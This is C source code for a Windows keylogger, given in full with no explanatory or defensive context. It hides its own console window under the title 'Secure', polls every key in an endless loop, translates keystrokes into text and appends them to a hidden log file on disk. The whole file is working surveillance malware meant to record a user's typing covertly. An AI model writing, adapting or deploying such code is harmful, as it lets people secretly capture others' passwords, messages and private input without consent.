#include <stdio.h>
#include <string.h>
#include <windows.h>

#define _MAX_CHAR 500
#define _LOG_FILE_NAME "keylogs.txt"
#define _CONSOLE_NAME "Secure"

int recordKeyStroke(int, char *);
int hideConsole(void);
void logKeys(char *);

int main()
{
    register short i;
    char * data = (char *) calloc(_MAX_CHAR + 12, sizeof(char));
    hideConsole();
    while(1)
    {
        for(i = 0; i < 255; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
            {
                recordKeyStroke(i, data);
            }
        }
        Sleep(10);
        logKeys(data);
        memset(data, 0, _MAX_CHAR + 12);
    }
    return 0;
}

void logKeys(char *data)
{
    FILE *fptr;
    fptr = fopen("H:\\Desktop\\My Documents\\notes\\C\\keylogs.txt", "a");
    fprintf(fptr, "%s", data);
    fclose(fptr);
}

int hideConsole(void)
{
    if(!SetConsoleTitle(_CONSOLE_NAME))
    {
        return -1;
    }

    HWND thisWindow;
    thisWindow = FindWindow(NULL, _CONSOLE_NAME);
    ShowWindow(thisWindow, 0);
    return 0;
}

int recordKeyStroke(int key, char *buffer)
{
    switch(key)
    {
        //shift key
        case VK_SHIFT:
			strcat (buffer, "[SHIFT]");
			return 0;
        case VK_CONTROL:
            strcat (buffer, "[CTRL]");
			return 0;
        case VK_MENU:
            strcat(buffer, "[ALT]");
            return 0;
        case VK_TAB:
            strcat(buffer, "[TAB]");
            return 0;
        case VK_BACK:
            strcat(buffer, "[BACKSPACE]");
            return 0;
        case VK_SPACE:
            strcat(buffer, " ");
            return 0;
        case VK_CAPITAL:
            strcat(buffer, "[CAPSLOCK]");
            return 0;
        case VK_RETURN:
            strcat(buffer, "\n");
            return 0;
        case VK_OEM_1:
            strcat(buffer, "[;:]");
            return 0;
        case VK_OEM_PLUS:
            strcat(buffer, "[+]");
            return 0;
        case VK_OEM_COMMA:
            strcat(buffer, "[,<]");
            return 0;
        case VK_OEM_MINUS:
            strcat(buffer, "[-]");
            return 0;
        case VK_OEM_PERIOD:
            strcat(buffer, "[.>]");
            return 0;
        case VK_OEM_2:
            strcat(buffer, "[/?]");
            return 0;
        case VK_OEM_3:
            strcat(buffer, "[`~]");
            return 0;
        case VK_OEM_4:
            strcat(buffer, "[[{]");
            return 0;
        case VK_OEM_5:
            strcat(buffer, "[\\|]");
            return 0;
        case VK_OEM_6:
            strcat(buffer, "[]}]");
            return 0;
        case VK_OEM_7:
            strcat(buffer, "\'\"");
            return 0;
        case 48:
            strcat(buffer, "0");
            return 0;
        case 49:
            strcat(buffer, "1");
            return 0;
        case 50:
            strcat(buffer, "2");
            return 0;
        case 51:
            strcat(buffer, "3");
            return 0;
        case 52:
            strcat(buffer, "4");
            return 0;
        case 53:
            strcat(buffer, "5");
            return 0;
        case 54:
            strcat(buffer, "6");
            return 0;
        case 55:
            strcat(buffer, "7");
            return 0;
        case 56:
            strcat(buffer, "8");
            return 0;
        case 57:
            strcat(buffer, "9");
            return 0;
        case 65:
            strcat(buffer, "A");
            return 0;
        case 66:
            strcat(buffer, "B");
            return 0;
        case 67:
            strcat(buffer, "C");
            return 0;
        case 68:
            strcat(buffer, "D");
            return 0;
        case 69:
            strcat(buffer, "E");
            return 0;
        case 70:
            strcat(buffer, "F");
            return 0;
        case 71:
            strcat(buffer, "G");
            return 0;
        case 72:
            strcat(buffer, "H");
            return 0;
        case 73:
            strcat(buffer, "I");
            return 0;
        case 74:
            strcat(buffer, "J");
            return 0;
        case 75:
            strcat(buffer, "K");
            return 0;
        case 76:
            strcat(buffer, "L");
            return 0;
        case 77:
            strcat(buffer, "M");
            return 0;
        case 78:
            strcat(buffer, "N");
            return 0;
        case 79:
            strcat(buffer, "O");
            return 0;
        case 80:
            strcat(buffer, "P");
            return 0;
        case 81:
            strcat(buffer, "Q");
            return 0;
        case 82:
            strcat(buffer, "R");
            return 0;
        case 83:
            strcat(buffer, "S");
            return 0;
        case 84:
            strcat(buffer, "T");
            return 0;
        case 85:
            strcat(buffer, "U");
            return 0;
        case 86:
            strcat(buffer, "V");
            return 0;
        case 87:
            strcat(buffer, "W");
            return 0;
        case 88:
            strcat(buffer, "X");
            return 0;
        case 89:
            strcat(buffer, "Y");
            return 0;
        case 90:
            strcat(buffer, "Z");
            return 0;
    }
}
